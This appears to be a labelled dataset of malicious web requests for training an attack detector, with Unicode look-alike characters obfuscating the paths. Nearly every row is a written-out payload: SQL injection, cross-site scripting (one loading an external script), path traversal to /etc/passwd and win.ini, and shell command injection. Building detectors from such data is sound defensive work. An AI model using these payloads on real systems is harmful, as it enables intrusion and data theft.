sentences 	 labels
/ 𝚜𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo pdoptj )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ ι𝙜tf0zon . exe ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ n𝘴n /  .  .  \ util / copy . bas  	 1
/ ℯ𝘅amples / jsp / cal / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝖘𝓉ring / strings / parameters = -9484 '  or  ( 7129 = 2349 )  * 2349 and  ' fcsa '  like  ' fcsa  	 1
/ ꬲ⤬amples / jsp / num / index . php ? _language =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ ꜱ𝘁ring / strings / parameters = | echo phlzmc $  (  ( 98 + 93 )  )  $  ( echo phlzmc ) phlzmc \  	 1
/ 𝙝𝕖lp . php ? q =  " rm \ xa0q88986355 & rem \ xa0  	 1
/ 𝘢ꓒmin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = limbo_com_fm_php_shell . nasl-1331904435  	 1
/ 𑣁𝑡ring / strings / parameters = |   [  1 -ne  $  ( echo ftwokg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ 𝔠𝗴i-bin / search . jsp ? q =  %  "  < script > alert ( 1332008604 )  <  / script >  	 1
/ ρ𝘩pmyadmin /  ?  "  >  < script > alert (  ' struts_sa_surl_xss . nasl '  )  <  / script >  	 1
/ ƽ𝘵ring / strings / parameters = 1 where 8905 = 8905 and make_set ( 7654 = 1923 , 1923 )  --  	 1
/ ƽ𝑡ring / strings / parameters = 1 %  "  "  )  union all select null , null , null , null , null , null , null , null , null --  	 1
/ 𝘶∨azfs7p . x ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ Ⳓ𝐪bynt4f . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝑠𝚝ring / strings / parameters = echo urbcmk $  (  ( 17 + 54 )  )  $  ( echo urbcmk ) urbcmk '  	 1
/ ƽ𝑐ripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1331905207 , 2042987140  --  	 1
/ г𝟛le3om5 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝚜𝗰ripts / callboth . php ? seq = 654321 & out = 123456 & in = 1331908862 @ nessus \ x0d \ x0aasteridex_in_code_injection . nasl  	 1
/ 𝐞хamples / jsp / cal / perl . exe ? -v  	 1
/ 𝙨𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo bodwqd )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ 𝕤𝗍ring / modo = registro & login = liping & password = paletada & nombre = laura & apellidos = esparraguera & email = palk @ interpretacion-diccionario-y-significado-de-los-sueos . com .  & dni = b93390897h & direccion = calle + gonzalo + de + berceo + 76 ,  +  & ciudad = rioseco + de + soria & cp = 16890 & provincia = salamanca & ntc = 5041701632668504 & b1 = registrar  	 1
/ 𝖽𝘥a2qr7j . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝓈𝔱ring / strings / parameters = 10 + union + select + load_file ( 0x2f6574632f706173737764 )  	 1
/ 𝚜𝗍ring / strings / parameters = 1 )  where 2678 = 2678 union all select null , null , null , null , null , null , null , null , null #  	 1
/ 𝒃zʋf9ozq . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ ѕ𝚝ring / strings / parameters = &  & echo zepmbc $  (  ( 82 + 3 )  )  $  ( echo zepmbc ) zepmbc &  	 1
/ 𝕖𝕩amples / jsp / checkbox / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝘀𝘵ring / strings / parameters = -2168 "  "  )  )  union all select 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 , 4935 --  	 1
/ 𝗌𝕥ring / strings / parameters = 1 '  +  ( select  ' xqjx '  where 7048 = 7048 and 9198 = 9198 --  	 1
/ 𝖘𝕥ring / modo = registro & login = anurag & password = am60a4i7o & nombre = custodio & apellidos = amazarray + gersol & email = martell @ 923 . pe & dni = 15138092k & direccion = sant + josep ,  + 93 ,  +  & ciudad = castellar + del + valls & cp = 03813 & provincia = soria "  >  <  !  --  # exec + cmd =  " dir +  "  --  >  <  & ntc = 2906865498291139 & b1 = registrar  	 1
/ 𝖘𝘁ring / strings / parameters = 1 '  where 2183 = 2183 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  	 1
/ 𝒔𝐭ring / modo = registro & login = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & password = alarm ? ista & nombre = zelina & apellidos = morcillo + amparan & email = colona @ aebo . lb & dni = 86164975y & direccion = alamo ,  + s / n ,  +  & ciudad = casas + de + reina & cp = 05413 & provincia = salamanca & ntc = 0630515936517830 & b1 = registrar  	 1
/ 𝚜𝙩ring / strings / parameters = 1 %  '  )  union all select null , null , null , null , null , null , null #  	 1
/ 𑣖k𝚛0ih0v . do ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  	 1
/ 𝐬𝙩ring / strings / parameters = 1 )  where 7199 = 7199 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ 𝓈𝘵ring / strings / parameters = '  | echo $ ifsfrpqgh $  (  ( 5 + 72 )  )  $  ( echo $ ifsfrpqgh ) frpqgh  	 1
/ 𝓼𝙩ring / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null )   --  	 1
/ ꜱ𝓉ring / strings / parameters = 1 "  "  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ 𝑠𝙩ring / strings / parameters = |   [  6 -ne  $  ( echo dlkwgt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ m𝙖𝒊n . php ? logout =  & ver \ x0b > q39725894 & rem \ x0b  	 1
/ 𝒔𝕥ring / strings / parameters = < form >  < button formaction =  " javascript : alert ( 1 )  "  > x <  / button >  	 1
/ 𝘂𝗰3w3bdi . kspx ?  < script > document . cookie =  " testxllt = 9940 ;  "  <  / script >  	 1
/ 𐑈𝓽ring / modo = registro & login = polk & password = d8fide10i3 & nombre = norcelo & apellidos = payseo + el_gueta & email = cummings @ muebetuweb . lr & dni = 85128607h & direccion = calle + floridablanca ,  + 114 ,  + 7b & ciudad = linares + de + riofro & cp = 07127 & provincia = zaragoza & ntc = 3967507613982177 & b1 = registrar  	 1
/ ƽ𝘁ring / strings / parameters = '  ;  str =  $  ( echo hldnyh )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ 𝚝o𝓅 . php ? stuff =  '  ; uname \ x09 > q48683432 \ x09 #  	 1
/ 𝓅𝒽pmyadmin / secure . php ? cfgprogdir =  / etc / passwd \ x00  	 1
/ m𝑎𝖎n . php ? logout =  " ver \ xa0 > q51679818 & rem \ xa0  	 1
/ 𝒔𝓽ring / str =  $  ( echo jadkkf )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ 𝚜𝖙ring / strings / parameters = \ x3cscript > javascript : alert ( 1 )  <  / script >  	 1
/ 𑣁𝚝ring / modo = registro & login = bustillo & password = des6ra50ce3 & nombre = juana + del + pilar & apellidos = soria + lloren & email = tushingham @ saavedradiaz . hu & dni = 05392148m & direccion = carrer + auro + s / n ,  + 1 ? h & ciudad = zugarramurdi & cp = 10130 & provincia = lleida & ntc = 250050684012121 & b1 = registrar  	 1
/ 𝕤𝚝ring / strings / parameters = 1 '  )  rlike  ( select  ( case when  ( 7447 = 3981 )  then 1 else 0x28 end )  )  	 1
/ 𑣁𝑡ring / strings / parameters = 1 )  )  as ewlg where 3722 = 3722 rlike sleep ( 5 )  --  	 1
/ l𝟳𝟱2x1ry . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ ℮𝚡amples / servlets / servlet / directory . php ? dir =  ; cat  / etc / passwd  	 1
/ 𝘀𝔱ring / strings / parameters = &  & echo $ ifsdkxdpb $  (  ( 45 + 44 )  )  $  ( echo $ ifsdkxdpb ) dkxdpb \  	 1
/ 𝘀𝐭ring / strings / parameters = 1 '  )  procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  and  (  ' szib '  like  ' szib  	 1
/ 𝓼𝕥ring / strings / parameters = < svg onload = document . writeln ( decodeuri ( location . hash )  )  >  #  < img src = onerror = alert ( 1 )  >  	 1
/ 𝗌𝓉ring / modo = entrar & login = rizzardi & pwd =  , 9 / oc7c4 , 0 & remember = on & b1 = entrar  	 1
/ 𝘱𝘩pmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html  	 1
/ m𝙖n𝙖ger / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 1
/ 𝓆սery . idq ? citemplate =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / win . ini  	 1
/ 𝓱𝒆lp . php ? q =  ' sleep 11  #  	 1
/ 𝘀𝐭ring / strings / parameters = 1 )  )  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ 𑣁𝘁ring / strings / parameters = echo $ ifsuhekzf $  (  ( 6 + 76 )  )  $  ( echo $ ifsuhekzf ) uhekzf &  	 1
/ 𝙘𝘨i-bin / dataservice . asmx / authuser ? username =  ' nessus1331919210 & password = nasl & needcompress = 0  	 1
/ moo𝒅l℮ / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + del + esbq  	 1
/ j𝟐k𝓭mfw4 . html ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝘴𝘵ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qusuij )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  *  	 1
/ е𝑥amples / jsp / checkbox / item . fts ? href =  "  >  < script > alert (  " ftgate_44002 . nasl "  )  <  / script >  ;  	 1
/ 𐑈𝚝ring / strings / parameters = echo xrkwtl $  (  ( 1 + 66 )  )  $  ( echo xrkwtl ) xrkwtl /  /  	 1
/ 𝗌𝘁ring / strings / parameters = 1 '  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' zetf '  =  ' zetf  	 1
/ j𝚊ѵascript / tickets . exe  	 1
/ 𝑠𝘵ring / strings / parameters = -5026 '  or  ( 8459 = 8459 )  * 4906 and  ' uavj '  like  ' uavj  	 1
/ 𑣁𝖙ring / strings / parameters = -2679 '  )  )  )  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  (  ' cutk '  like  ' cutk  	 1
/ 𝒔𝒕ring / strings / parameters = )  )  waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ 𝐬𝕥ring / strings / parameters = 1 %  '  )  )  )  and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  	 1
/ ꜱ𝙩ring / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ 𝒔𝒕ring / id = 1 & nombre = queso + manchego & precio = 39 /  & cantidad = 71 & b1 = aadir + al + carrito  	 1
/ 𑣁𝚝ring / strings / parameters = .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / conf / server . xml  	 1
/ 𝚑𝟒bi26jd . cfm ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  	 1
/ 𝕖𝒙amples / jsp / sessions / workarea / contentdesigner / ekformsiframe . aspx ? id =  "  >  < script > alert (  ' nessus '  )  <  / script >  	 1
/ 𝖘𝓉ring / strings / parameters = |   [  7 -ne  $  ( echo zdevvw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ ⅰ don ' t feel like dancing /  	 1
/ ℮𝑥amples / jsp / colors / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini  	 1
/ 𝙨𝖙ring / modo = insertar & precio = 405 & b1 = confirmar /  	 1
/ 𝖘𝓉ring / strings / parameters = < iframe src =  "  "  /  / srcdoc =  '  & lt ; svg onload & equals ; alert & lpar ; 1 & rpar ;  & gt ;  '  >  	 1
/ 𝕥o𝓹 . php ? stuff =  "  | ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0  	 1
/ 𝙨𝓉ring / strings / parameters = "  |   [  3 -ne  $  ( echo bwwrbc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ 𝐬𝚝ring / strings / parameters = 1 '  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ' ebuo '  =  ' ebuo  	 1
/ 𝔰𝒕ring / strings / parameters = "  ; echo irkbup $  (  ( 99 + 87 )  )  $  ( echo irkbup ) irkbup \  	 1
/ 𝓈𝙩ring / strings / parameters = ;  str =  $  ( echo nmeesi )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ j𝖺𝐯ascript / right . exe  	 1
/ 𝐞n-𝘂s / n9xlumt5 . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝐭o𝗽 . php ? stuff =  "  & rm \ x09q45798999 & rem \ x09  	 1
/ 𝒔𝗍ring / strings / parameters = $  { exec ( print (  ` echo hfmdnb echo  $  (  ( 56 + 41 )  )  echo hfmdnb echo hfmdnb `  )  ;  .  " hfmdnb  	 1
/ 𝖼𝐠i-bin / ikonboard . cgi ? act = st & f = 1 & t = 1 & hl = nessus & st =  '  	 1
/ Ƽ𝗊nlm5z2 . php ?  < script > document . cookie =  " testsixi = 8451 ;  "  <  / script >  	 1
/ 𝓼𝙩ring / strings / parameters = 1 )  )  union all select null --  	 1
/ 𝘦n-𝐮s / account / search . php ? submit = true & search =  '  )  ;  	 1
/ m𝘢ⅰn . php ? stuff =  \ x0auname \ x09 > q82381573 \ x09 #  	 1
/ 𝙨𝗍ring / strings / parameters = < u oncopy = alert (  )  >  copy me <  / u >  	 1
/ 𐑈𝓉ring / modo = insertar & precio = 810 & b1 = confirmar /  	 1
/ 𝘀𝓽ring / strings / parameters = -7795 "  "  )  where 1712 = 1712 union all select 1712 , 1712 , 1712 , 1712 #  	 1
/ ѕ𝕥ring / strings / parameters = 1 "  "  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  and  "  " ygzq "  "  like  "  " ygzq  	 1
/ 𝓈𝒕ring / strings / parameters = ;  str =  $  ( echo otxvur )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ 𝗌𝕥ring / modo = registro & login = karly & password = gira0dil26 & nombre = nadim & apellidos = collantes + cartaya & email = westmore-dutt @ transportesvegasl . ba & dni = 31767959z & direccion = calle + fuero + s + 1 * 56 ,  +  & ciudad = valdunquillo & cp = 16660 & provincia = mlaga & ntc = 1873694228595565 & b1 = registrar  	 1
/ 𐐽𝑎cti / htsearch ? exclude =  `  / etc / passwd `  	 1
/ m𝔞ꭵn . php ? stuff =  '  & uname \ x09 #  	 1
/ j𝘢𝖛ascript / traceroute . exe  	 1
/ 𝕡𝓱preactor / inc / updatecms . inc . php ? pathtohomedir = xxpathxx ?  	 1
/ 𝙨𝘁ring / strings / parameters = 1 "  "  )  and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ 𝕤𝓉ring / strings / parameters = 1 %  "  "  )  )  and 4595 = 4595 #  	 1
/ ƽ𝙩ring / strings / parameters = 1 ,  ( select  ( case when  ( 2970 = 5830 )  then 1 else 2970 *  ( select 2970 from mysql . db )  end )  )  	 1
/ ѕ𝕥ring / modo = entrar & login = celso & pwd = desvarar & remember = on & b1 = entrar "  + and +  " 1 "  =  " 1  	 1
/ m𝚊ın . php ? stuff =  "  | ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0  	 1
/ ƽ𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bkxiyp )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 1
/ 𝚜𝐜ripts / cal_week . php ? op = week & catview = 999 '  	 1
/ 𝚌𝚐i-bin / generate . cgi ? content =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00board = board_1  	 1
/ jᏎᑯrbkil . exe ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ ѕ𝘵ring / strings / parameters = | echo orhnzl $  (  ( 45 + 63 )  )  $  ( echo orhnzl ) orhnzl "  	 1
/ 𑜎𝙖pchat / src / eng . roomdeleteconfirm . php ? sysfiledir = xxpathxx  	 1
/ 𝕤𝘵ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ehnnqt )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/ j𝒶𝙫ascript / wysiwyg . exe  	 1
/ 𑢻𞣋 $  $ hoteldescription /  	 1
/ 𝘤𝖺cti / file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ 𝑠𝚝ring / strings / parameters = 1 < vmlframe xmlns = urn : schemas-microsoft-com : vml style = behavior : url (  # default # vml )  ; position : absolute ; width : 100 %  ; height : 100 %  src = test . vml # xss >  <  / vmlframe >  	 1
/ 𝚜𝚝ring / strings / parameters = '  echo szqvut $  (  ( 92 + 45 )  )  $  ( echo szqvut ) szqvut "  	 1
/ 𝙨𝓽ring / strings / parameters = ;  str =  $  ( echo tsxscx )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ 𝓈ϲripts / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  	 1
/ 𝔰𝖙ring / strings / parameters = "  "  ; alert (  ' xss )  /  /  	 1
/ іnⅆex . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1332010395 '  , null , null , null , null  --  	 1
/ ꜱ𝘵ring / strings / parameters = aim :   & c :  \ windows \ system32 \ calc . exe "  ini =  " c :  \ documents and settings \ all users \ start menu \ programs \ startup \ pwnd . bat "  	 1
/ ℊꭚ23xnjq . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝘴𝓉ring / strings / parameters = "  < script src =  ' data : text / javascript , prompt (  / xss /  . source )  ; var x  =  prompt ; x ( 0 )  ; x (  / xss /  . source )  ; x '  >  <  / script >  "  	 1
/ 𝔰𝘵ring / strings / parameters = "  )  ;  } print (  ` echo qnfoee echo  $  (  ( 91 + 41 )  )  echo qnfoee echo qnfoee `  )  ;  )  } qnfoee  	 1
/ ѕ𝕥ring / strings / parameters = < keygen autofocus onfocus = alert ( 1 )  >  	 1
/ m𝕒𝚒l / content / fnc-readmail3 . php ? __socketmail_root = xxpathxx ?  	 1
/ 𑣁𝕥ring / strings / parameters = " echo $ ifsitsadj $  (  ( 94 + 48 )  )  $  ( echo $ ifsitsadj ) itsadj &  	 1
/ 𝗊𑣆03m78q . idc ?  < meta http-equiv = set-cookie content =  " testvowq = 604 "  >  	 1
/ 𝔰𝚌s86g1p . php3 ?  < script > document . cookie =  " testquyx = 2820 ;  "  <  / script >  	 1
/ 𝙨𝘵ring / strings / parameters = -1647 '  )  )  union all select 3030 , 3030 , 3030 , 3030 , 3030 , 3030 , 3030 --  	 1
/ 𝖘𝘵ring / strings / parameters = +  	 1
/ 𝚜𝖈ripts / cal_cat . php ? op = cats & year = 2008 & catview = 1 + union + select + 1 , 1331919001  	 1
/ 𝙘o𝐫e / admin / edit . php ? p = admin & do = edit & c = ok & absoluteurlxxpathxx  	 1
/ 𝐬𝕥ring / strings / parameters = ;  str =  $  ( echo pmpvhc )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 1
/ 𝕥o𝔭 . php ? stuff =  ' rm \ x09q68811991 \ x09 #  	 1
/  ?  < meta http-equiv = set-cookie content =  " testcrcv = 6167 "  >  	 1
/ ᑯ𑣆ktpmcq . do ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ j𝑎𝐯ascript / 2012 . exe  	 1
/ j𝗮טascript / alert . exe  	 1
/ 𝓼𝘁ring / strings / parameters = '  |   [  5 -ne  $  ( echo lvddnf  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ 𝖘𝚝ring / strings / parameters = < script a =  "  >  '  >  "  src =  " http :  /  / ha . ckers . org / xss . js "  >  <  / script >  	 1
/ n𝗒𝑣bv05h . fts ?  < script > document . cookie =  " testftxz = 5980 ;  "  <  / script >  	 1
/ 𑣁𝒕ring / modo = insertar & precio = paros "  style =  " background : url ( javascript : alert (  ' paros '  )  )  & b1 = pasar + por + caja  	 1
/ ꜱ𝚝ring / modo = registro & login =  + stan + ly & password = 49pu + 22 & nombre = lavinia & apellidos = preisz & email = carslisle @ cirujanaplastica . ck & dni = 99142820d & direccion = calle + santa + agueda + 162 + 5 ? c & ciudad = arroyo + del + ojanco & cp = 10893 & provincia = ciudad + real & ntc = 5833239568926901 & b1 = registrar  	 1
